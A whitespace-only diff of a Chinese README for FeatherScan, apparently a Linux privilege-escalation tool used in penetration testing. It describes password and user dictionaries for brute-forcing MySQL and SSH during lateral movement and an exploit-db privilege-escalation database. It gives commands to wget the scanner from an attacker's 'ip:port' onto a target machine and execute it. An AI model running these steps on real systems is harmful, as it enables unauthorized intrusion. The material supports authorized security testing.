@@ -4,17 +4,18 @@
 
 ## 文件介绍
 
-pass.txt ：用于爆破的密码字典，比如横向移动的mysql，ssh密码爆破
-user.txt : 爆破时候用的用户字典，脚本中也有默认的账号密码弱口令进行爆破
+pass.txt ：用于爆破的密码字典，比如横向移动的mysql，ssh密码爆破  
+user.txt : 爆破时候用的用户字典，脚本中也有默认的账号密码弱口令进行爆破  
 feather_vuln_db.txt : linux提权exploit-db漏洞库，需要同FeatherScan一起上传到靶机
 
 generate_vuln_db.sh : 在kali上执行，这是一个筛选脚本，用于获取最新的linux提权explod-db漏洞库，kali中更新本地漏洞库使用命令 searchsploit -u ，再执行这个脚本，会生成一个txt漏洞库，也就是 feather_vuln_db.txt
 
-靶机：
-wget http://ip:port/FeatherScan_v4_5
-wget http://ip:port/feather_vuln_db.txt
-chmod +x FeatherScan_v4_5
-./FeatherScan_v4_5
+靶机：  
+
+wget http://ip:port/FeatherScan_v4_5  
+wget http://ip:port/feather_vuln_db.txt  
+chmod +x FeatherScan_v4_5  
+./FeatherScan_v4_5  
 
 执行示例：
 ```
